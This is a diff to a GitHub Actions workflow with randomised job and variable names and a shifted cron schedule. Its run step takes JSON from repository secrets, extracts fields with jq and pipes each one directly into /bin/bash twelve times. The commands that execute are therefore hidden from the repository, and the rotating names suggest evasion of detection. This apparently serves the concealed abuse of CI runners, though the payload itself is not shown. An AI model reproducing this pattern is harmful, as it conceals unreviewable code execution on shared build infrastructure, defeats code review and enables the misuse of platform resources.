@@ -3,7 +3,7 @@ name: gucaishen4627
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: gucaishen4627
         env:
-          qlft17480: ${{ secrets.qlft17480 }}
+          f6: ${{ secrets.f6 }}
         run: |
-          echo $qlft17480 | jq -r .hjopk589 | /bin/bash
-          echo $bv26773 | jq -r .cv5873 | /bin/bash
-          echo $vnkz00 | jq -r .ycdhb9 | /bin/bash
-          echo $ohq9 | jq -r .s86254 | /bin/bash
-          echo $xj70775 | jq -r .n2335 | /bin/bash
-          echo $y9913 | jq -r .rs32 | /bin/bash
-          echo $z26 | jq -r .sxa5 | /bin/bash
-          echo $z1 | jq -r .dpsxo8 | /bin/bash
-          echo $bpr580 | jq -r .brwh84 | /bin/bash
-          echo $cwhkt04 | jq -r .xdcr8 | /bin/bash
+          echo $f6 | jq -r .bnwc3 | /bin/bash
+          echo $kms3926 | jq -r .dit24377 | /bin/bash
+          echo $uyx589 | jq -r .dq89 | /bin/bash
+          echo $npl42173 | jq -r .dzitg8 | /bin/bash
+          echo $msnae75397 | jq -r .jvdl8 | /bin/bash
+          echo $qjmn374 | jq -r .cpq32 | /bin/bash
+          echo $zmq2 | jq -r .c9 | /bin/bash
+          echo $znk79558 | jq -r .kebdz00330 | /bin/bash
+          echo $pnm71976 | jq -r .cib75056 | /bin/bash
+          echo $ybsvy21 | jq -r .y57 | /bin/bash
+          echo $y73 | jq -r .o5 | /bin/bash
+          echo $pzue6429 | jq -r .x101 | /bin/bash
 
